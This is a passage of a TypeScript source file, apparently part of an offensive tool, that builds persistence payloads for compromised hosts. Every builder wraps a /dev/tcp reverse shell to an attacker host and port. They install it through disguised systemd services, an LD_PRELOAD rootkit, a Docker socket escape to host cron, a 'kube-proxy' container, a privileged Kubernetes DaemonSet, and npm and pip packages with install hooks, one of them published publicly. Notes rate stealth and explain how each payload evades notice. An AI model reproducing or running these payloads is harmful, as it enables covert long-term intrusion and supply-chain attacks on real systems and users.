      command:`mkdir -p ~/.config/systemd/user/ && cat > ~/.config/systemd/user/dbus-sync.service << 'EOF'\n[Unit]\nDescription=D-Bus Sync Service\nAfter=default.target\n[Service]\nType=simple\nExecStart=/bin/bash -c '${cmd}'\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=default.target\nEOF\nsystemctl --user enable dbus-sync 2>/dev/null; systemctl --user start dbus-sync 2>/dev/null; loginctl enable-linger $USER 2>/dev/null`,
      notes:"User-space systemd service — no root. loginctl enable-linger survives logout. Restarts every 30s." },
    { technique:"systemd system service (root)", category:"linux", stealth:5,
      command:`cat > /etc/systemd/system/systemd-networkd-resolver.service << 'EOF'\n[Unit]\nDescription=Network Resolver Cache\nAfter=network.target\n[Service]\nType=simple\nExecStart=/bin/bash -c '${cmd}'\nRestart=always\nRestartSec=60\nKillMode=none\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload 2>/dev/null; systemctl enable systemd-networkd-resolver 2>/dev/null; systemctl start systemd-networkd-resolver 2>/dev/null`,
      notes:"Root systemd service named to blend with real systemd services. KillMode=none prevents child kill on stop." },
  ];
}

export function buildLdPreloadPersistence(lhost: string, lport: string): PersistencePayload[] {
  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
  return [
    { technique:"LD_PRELOAD rootkit via /etc/ld.so.preload (root)", category:"linux", stealth:5,
      command:`cat > /tmp/nx_hook.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid __attribute__((constructor)) nx_init(void){\n  if(fork()==0){setsid();system("${cmd}");exit(0);}}\nEOF\ngcc -shared -fPIC -nostartfiles -o /lib/libnss_nx.so.2 /tmp/nx_hook.c 2>/dev/null && echo /lib/libnss_nx.so.2 >> /etc/ld.so.preload && rm /tmp/nx_hook.c`,
      notes:"LD_PRELOAD via /etc/ld.so.preload — constructor fires on every new process. Rootkit-level persistence. Requires root." },
    { technique:"LD_PRELOAD per-user via .bashrc", category:"linux", stealth:4,
      command:`cat > /tmp/nx_h.c << 'EOF'\n#include <stdlib.h>\n#include <unistd.h>\nvoid __attribute__((constructor)) nx_init(void){unsetenv("LD_PRELOAD");if(fork()==0){setsid();system("${cmd}");exit(0);}}\nEOF\ngcc -shared -fPIC -nostartfiles -o ~/.config/.libnx.so /tmp/nx_h.c 2>/dev/null && echo 'export LD_PRELOAD=~/.config/.libnx.so' >> ~/.bashrc && rm /tmp/nx_h.c`,
      notes:"User-level LD_PRELOAD injected via shell profile. Fires on every interactive shell." },
  ];
}

export function buildDockerSocketPersistence(lhost: string, lport: string): PersistencePayload[] {
  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
  return [
    { technique:"Docker socket container escape + host cron", category:"linux", stealth:3,
      command:`docker -H unix:///var/run/docker.sock run --rm -v /:/host --privileged alpine sh -c "echo '* * * * * root ${cmd}' >> /host/etc/cron.d/nx && chmod 644 /host/etc/cron.d/nx" 2>/dev/null`,
      notes:"Docker socket → privileged container with host / mount → writes cron to host filesystem. Persistent root shell." },
    { technique:"Docker container implant + restart always", category:"linux", stealth:4,
      command:`docker run -d --name "kube-proxy" --restart always --net=host --pid=host --privileged -v /:/host alpine /bin/sh -c "while true; do ${cmd} 2>/dev/null; sleep 30; done" 2>/dev/null`,
      notes:"Persistent container named 'kube-proxy' — blends with K8s. restart=always survives host reboot." },
  ];
}

export function buildK8sPersistence(lhost: string, lport: string): PersistencePayload[] {
  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
  return [
    { technique:"K8s DaemonSet (runs on every node)", category:"linux", stealth:4,
      command:`kubectl apply -f - << 'EOF'\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-monitor\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: node-monitor\n  template:\n    metadata:\n      labels:\n        app: node-monitor\n    spec:\n      hostPID: true\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n      containers:\n      - name: monitor\n        image: alpine:latest\n        command: ["/bin/sh","-c","while true; do ${cmd} 2>/dev/null; sleep 60; done"]\n        securityContext:\n          privileged: true\nEOF`,
      notes:"DaemonSet in kube-system namespace named 'node-monitor' — runs on ALL nodes. Privileged + host PID/network." },
  ];
}

export function buildNpmPipPersistence(lhost: string, lport: string): PersistencePayload[] {
  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
  return [
    { technique:"npm package post-install hook (supply chain)", category:"linux", stealth:5,
      command:`_D=$(mktemp -d); echo '{"name":"@nx/utils","version":"1.0.0","scripts":{"postinstall":"node -e \\"require('"'"'child_process'"'"').exec('"'"'${cmd}'"'"')\""}}' > "$_D/package.json"; cd "$_D" && npm publish --access public 2>/dev/null`,
      notes:"npm package with postinstall hook fires on every npm install. Classic supply chain attack." },
    { technique:"pip package post-install hook", category:"linux", stealth:5,
      command:`_D=$(mktemp -d); mkdir -p "$_D/nx_util"; echo 'pass' > "$_D/nx_util/__init__.py"; printf 'from setuptools import setup\nimport subprocess\nsubprocess.Popen(["bash","-c","${cmd}"])\nsetup(name="nx-utils",version="1.0.0",packages=["nx_util"])' > "$_D/setup.py"; cd "$_D" && pip install . 2>/dev/null`,
      notes:"Python pip setup.py fires reverse shell on install via subprocess.Popen." },
  ];
}

export function buildAllPersistencePayloads(lhost: string, lport: string, cmd: string): PersistencePayload[] {
  return [
    ...buildLinuxPersistence(lhost, lport, cmd),
    ...buildWindowsPersistence(lhost, lport, cmd),
    ...buildExtendedLinuxPersistence(lhost, lport, cmd),
    ...buildExtendedWindowsPersistence(lhost, lport, cmd),
    ...buildSystemdPersistence(lhost, lport),
    ...buildLdPreloadPersistence(lhost, lport),
    ...buildDockerSocketPersistence(lhost, lport),
    ...buildK8sPersistence(lhost, lport),
    ...buildNpmPipPersistence(lhost, lport),
  ];
}
